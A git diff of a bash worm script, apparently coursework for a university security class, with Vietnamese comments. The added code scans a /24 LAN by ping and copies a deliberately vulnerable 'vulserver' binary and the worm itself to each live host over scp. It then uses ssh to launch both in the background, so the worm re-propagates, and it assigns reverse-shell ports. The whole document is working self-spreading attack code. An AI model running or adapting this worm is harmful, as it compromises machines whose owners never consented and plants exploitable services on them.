@@ -1,32 +1,41 @@
 #!/bin/bash
 
-# 1. Định vị file vul_server trên máy server (nơi đang bị reverse shell)
-VUL_SERVER="/home/server/./vul_server"
+NETWORK_PREFIX="192.168.42"
+VULSERVER_URL="https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/vulserver"
+WORM_URL="https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/worm.sh"
+PORT_BASE=4445
+USER=$(whoami)
+ME=$(hostname -I | awk '{print $1}')
+COUNT=0
 
-# 2. Xác định dải mạng LAN (ví dụ 192.168.207.0/24)
-SUBNET="192.168.42"
+echo "[*] Starting worm from $ME"
 
-# 3. Quét các host đang sống
-echo "[*] Scanning LAN for potential victims..."
-for ip in $(seq 1 254); do
-    ping -c 1 -W 1 $SUBNET.$ip > /dev/null 2>&1
+for i in $(seq 1 254); do
+    TARGET="$NETWORK_PREFIX.$i"
+
+    if [ "$TARGET" == "$ME" ]; then
+        continue
+    fi
+
+    echo "[*] Checking $TARGET..."
+    ping -c 1 -W 1 $TARGET &> /dev/null
     if [ $? -eq 0 ]; then
-        echo "[+] Host $SUBNET.$ip is up"
+        echo "[+] $TARGET is up!"
 
-        # 4. Thử gửi file vul_server (nếu máy victim mở SSH)
-        scp -o StrictHostKeyChecking=no $VUL_SERVER $SUBNET.$ip:/tmp/ 2>/dev/null
-        if [ $? -eq 0 ]; then
-            echo "[+] Successfully sent vul_server to $SUBNET.$ip"
+        # Copy vulserver và worm.sh sang máy
+        scp /home/server/vulserver $USER@$TARGET:/tmp/vulserver
+        scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh
 
-            # 5. SSH vào victim và chạy ./vul_server 5000 (nếu SSH không có mật khẩu)
-            ssh -o StrictHostKeyChecking=no $SUBNET.$ip "chmod +x /tmp/vul_server && /tmp/vul_server 5000 &" 2>/dev/null
-            if [ $? -eq 0 ]; then
-                echo "[*] Successfully started vul_server on victim $SUBNET.$ip"
-            else
-                echo "[-] Cannot execute vul_server remotely on $SUBNET.$ip"
-            fi
-        else
-            echo "[-] Failed to send vul_server to $SUBNET.$ip"
-        fi
+        # Tính port reverse shell cho máy này
+        PORT=$((PORT_BASE + COUNT))
+        echo "[*] Assigning reverse shell port: $PORT"
+
+        # SSH vào và chạy vulserver + worm.sh + reverse shell
+        ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh;
+                           nohup /tmp/vulserver 5000 >/dev/null 2>&1 &
+                           sleep 1;
+                           nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &
+
+        COUNT=$((COUNT + 1))
     fi
 done
